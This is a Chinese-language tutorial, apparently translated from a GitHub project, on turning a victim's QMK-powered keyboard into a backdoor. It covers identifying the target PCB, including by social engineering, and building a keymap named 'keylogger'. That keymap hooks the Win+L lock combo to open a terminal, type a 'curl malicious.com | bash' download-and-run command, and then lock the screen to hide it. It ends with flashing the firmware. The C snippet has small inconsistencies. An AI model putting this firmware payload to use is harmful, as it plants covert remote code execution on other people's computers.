**这个文章将教你如何使用qmk固件在键盘上创建一个“后门”。**

## 什么是QMK？

它是一个开源键盘固件，可以阅读[文档](a%20href=)获取更多信息。

## 这个“后门”如何操作？

后门挂钩使用[qmk](a%20href=)组合功能,比如屏幕锁定的一组击键，因此当用户锁定计算机时，它将击键注入目标计算机。

## 获得Shell

### Keyboard Recon

最重要的一步就是识别受害者键盘使用的PCB。我们可以通过以下几种方式完成：1.社会工程学2.打开keyboard case3.成为键盘大佬

### 获取QMK固件项目

    
    
    git clone https://github.com/qmk/qmk_firmware.git
    cd qmk_firmware
    util/(linux|macos)_install.sh
    

### 启用和配置组合功能

假设现在您已获取受害者的键盘PCB，转到`qmk_firmware/keyboards/<PCB_MODEL>/`然后在`rules.mk`文件的最后一行添加`COMBO_ENABLE
= yes`，然后还要修改文件`config.h`下面几行：

    
    
    #define COMBO_COUNT 1
    #define COMBO_TERM 300
    

`COMBO_COUNT`变量是您将配置的挂钩的数量，`COMBO_TERM`是固件检测键组合的毫秒时间。

### 创建HOOK

然后将默认密钥映射复制并新建一个名为keylogger的密钥映射

    
    
    cd qmk_firmware/keyboards/<PCB_MODEL>/keymaps
    mkdir keylogger
    cp -R default/* keylogger
    cd keylogger/
    

编辑`keymap.c`文件并在`#include
"action_layer.h`"行后插入恶意代码，您需要做的第一件事是使用您的钩子名称创建一个枚举函数：

    
    
    enum combo_events {
      LOCK_SCREEN
    }
    

然后你需要设置你想挂钩的组合键，在这个例子中让我们挂钩`WIN + L`锁定屏幕：`const uint16_t PROGMEM
lock_screen_combo [] =
{KC_LGUI，KC_L，COMBO_END};`如果您想挂钩其他键，只需查看[qmk文档](a%20href=)页面，您可以在其中找到包含所有密钥代码的列表。

### 采取行动

现在编码的最后一部分是在固件检测到HOOK时添加动作，为了做到这一点，让我们继续编辑`keymap.c`并声明负责检测和注入的函数：

    
    
    void process_combo_event(uint8_t combo_index, bool pressed) {
      switch(combo_index) {
        case LOCK_SCREEN_X:
          if (pressed) {
            // SEND THE COMBINATION KEYS TO OPEN TERMINAL WIN+ENTER
            register_code(KC_LGUI);
            register_code(KC_ENTER);
            // RELEASE THE KEYS TO OPEN THE TERMINAL
            unregister_code(KC_ENTER);
            unregister_code(KC_LGUI);
            //WAIT 500 MILLISECONDS FOR THE TERMINAL OPEN
            _delay_ms(500);
            //SEND COMMAND USING THE MACRO SEND_STRING WHICH SENDS KEYCODE BY KEYCODE WITHOUT DELAY
            SEND_STRING("curl malicious.com \\| bash ; exit" SS_TAP(X_ENTER));
            //SEND THE ORIGINAL KEYCODES RESPONSIBLE TO LOCK THE COMPUTER
            register_code(KC_LGUI);
            register_code(KC_L);
            // RELEASE THE KEYS RESPONSIBLE TO LOCK THE COMPUTER
            unregister_code(KC_L);
            unregister_code(KC_LGUI);
          }
      }
    break;
    }
    

### 编译代码

返回qmk项目根目录并运行：`make <KEYBOARD_PCB>:keylogger`如果没有错误，你做的一切都正确，并准备好继续前进。

### 引导模式

要将键盘置于引导模式，请按照QMK[指令操作](a%20href=)

### 编写恶意固件

只需运行命令：`sudo make
<KEYBOARD_PCB>:keylogger:dfu`现在，经过所有这些步骤，您已成功感染了受害者的键盘。了解有关QMK的更多[信息](a%20href=)

## Poc

PoC使用xd60 PCB视频[地址](http://www.youtube.com/watch?v=CbhiKdS48lc)  

参考来源[github](https://github.com/mthbernardes/QMKhuehuebr)，由周大涛编译，转载请注明来自FreeBuf.COM

